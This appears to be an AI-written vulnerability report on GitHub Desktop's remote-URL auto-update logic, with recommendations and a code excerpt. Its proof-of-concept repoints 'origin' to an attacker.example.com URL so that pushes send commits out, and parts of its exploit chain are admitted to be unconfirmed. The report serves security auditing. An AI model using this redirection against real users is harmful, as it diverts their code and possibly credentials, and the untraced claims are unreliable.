## Analysis



The report's core defect — a function that should defer to a canonical, composable comparison but instead reimplements its own inconsistent version of that comparison — has a direct analog in Desktop's remote-URL auto-correction logic.

### Title
Silent git remote URL rewrite from unvalidated GitHub API `clone_url` due to inconsistent URL-matching logic - (File: `app/src/lib/stores/updates/update-remote-url.ts`)

### Summary
`updateRemoteUrl` decides whether to silently overwrite a repository's `origin` remote URL based on three gates, but two of those gates use inconsistent, non-canonical URL parsing instead of the app's single source of truth for remote comparison (`parseRemote`/`urlMatchesRemote`), and the value ultimately written (`apiRepo.clone_url`) is never validated against any trusted-host allow-list at all.

### Finding Description
The codebase has a single canonical abstraction for comparing a git remote to a URL: `parseRemote` and `urlMatchesRemote` in `app/src/lib/repository-matching.ts`, which regex-parses both URLs into `{ hostname, owner, name }` and compares them case-insensitively. [1](#0-0) 

`updateRemoteUrl` uses this canonical function for two of its three checks (`urlsMatch`, `remoteUrlUnchanged`), but for the "protocol hasn't changed" check it bypasses `parseRemote` entirely and instead does its own ad-hoc comparison with the legacy `URL.parse()`: [2](#0-1) 

This is exactly the "Well Function" anti-pattern from the report: instead of composing with the canonical, vetted comparator everywhere, one code path reimplements its own formula, and that formula behaves differently for the same class of inputs (e.g., SCP-style SSH URLs like `git@github.com:owner/repo.git` are unparsable by legacy `URL.parse`, whereas `parseRemote` handles them via dedicated regexes).

More importantly, none of the three gates (`protocolsMatch`, `remoteUrlUnchanged`, `!urlsMatch`) validate that `apiRepo.clone_url` — the value that is actually written to disk — points at a trusted GitHub host at all: [3](#0-2) 

The gates only decide *whether* to write; the write itself (`gitStore.setRemoteURL(...)`) uses the raw API-supplied string verbatim, with no hostname allow-list check comparable to `isGitHubHost`/`isDotCom`/`isGHE` found elsewhere in the codebase. [4](#0-3) 

`IAPIRepository.clone_url` is a field taken directly from a GitHub API response object (`apiRepo`), which is the exact "attacker controls...a GitHub API object" primitive named in the task's valid-impact list — e.g., a compromised/malicious GitHub Enterprise Server the user has added as an account, or a MITM'd API response (GHES traffic can involve self-signed certs, and the codebase has cert-error-suppression logic for endpoint discovery, indicating GHES connections aren't always strictly pinned). [5](#0-4) 

### Impact Explanation
If a malicious/compromised GitHub Enterprise Server (or a MITM position on an insecurely-configured GHES connection) returns a `clone_url` for a tracked repository, `updateRemoteUrl` can be tricked — via the inconsistent protocol-matching logic — into calling `gitStore.setRemoteURL` with that attacker-chosen URL, silently repointing the user's `origin` remote. Because there is no host allow-list on the value being written, the new remote can point at any attacker-controlled host. Subsequent user-initiated `git push` operations would then silently send the user's commits (and, depending on credential-helper matching, potentially credentials) to the attacker's server instead of the intended repository — this is a "silent corruption of what the user commits or pushes" as defined in the task's valid-impact list.

### Likelihood Explanation
The write path is reached automatically during normal repository refresh/background sync flows (no unusual user action required beyond having added a GitHub Enterprise account and having Desktop periodically refresh repository metadata). The only friction is that the attacker needs to control an API response the user's Desktop instance trusts (a GHES instance the user added, or a MITM of such a connection) — this is within the stated in-scope category ("the attacker controls...a GitHub API object"), not local access, malware, or leaked credentials.

### Recommendation
- Replace the ad-hoc `URL.parse()`-based `protocolsMatch` check with the canonical `parseRemote` parsing used by `urlMatchesRemote`, so protocol/host comparisons are consistent everywhere.
- Add an explicit trusted-host check (reusing `isDotCom`/`isGHE`/the account's own endpoint hostname) before ever calling `gitStore.setRemoteURL`, so the new remote URL's hostname must match the hostname of the account/endpoint that produced `apiRepo`.

### Proof of Concept
1. User adds a GitHub Enterprise Server account in Desktop and has a local repository whose `origin` points at that GHES instance.
2. The GHES instance (compromised, or reached via a MITM'd connection) returns an API repository object whose `clone_url` is `https://attacker.example.com/owner/repo.git`.
3. Because `protocolsMatch` only compares `URL.parse(remoteUrl).protocol` vs `URL.parse(updatedRemoteUrl).protocol` (both `"https:"`), and `remoteUrlUnchanged`/`!urlsMatch` are satisfied by ordinary rename-detection logic, `updateRemoteUrl` calls `gitStore.setRemoteURL('origin', 'https://attacker.example.com/owner/repo.git')` — with no check that `attacker.example.com` is a host the user ever authenticated with.
4. The next `git push` from Desktop silently pushes the user's commits to `attacker.example.com`.

Note: I could not fully trace the exact call site/frequency of `updateRemoteUrl` within `app-store.ts` (the file's content was largely outside the index's available context), so the precise triggering conditions (e.g., which refresh cycle invokes it) are based on the function's own doc comments rather than direct confirmation from `app-store.ts`. A Devin session with full repo access would be needed to confirm the exact call frequency and any additional caller-side guards.

```typescript
export function urlMatchesRemote(url: string | null, remote: IRemote): boolean {
  if (url == null) {
    return false
  }

  const cloneUrl = parseRemote(url)
  const remoteUrl = parseRemote(remote.url)

  if (remoteUrl == null || cloneUrl == null) {
    return false
  }

  if (!caseInsensitiveEquals(remoteUrl.hostname, cloneUrl.hostname)) {
    return false
  }

  if (remoteUrl.owner == null || cloneUrl.owner == null) {
    return false
  }

  if (remoteUrl.name == null || cloneUrl.name == null) {
    return false
  }

  return (
    caseInsensitiveEquals(remoteUrl.owner, cloneUrl.owner) &&
    caseInsensitiveEquals(remoteUrl.name, cloneUrl.name)
  )
}
```
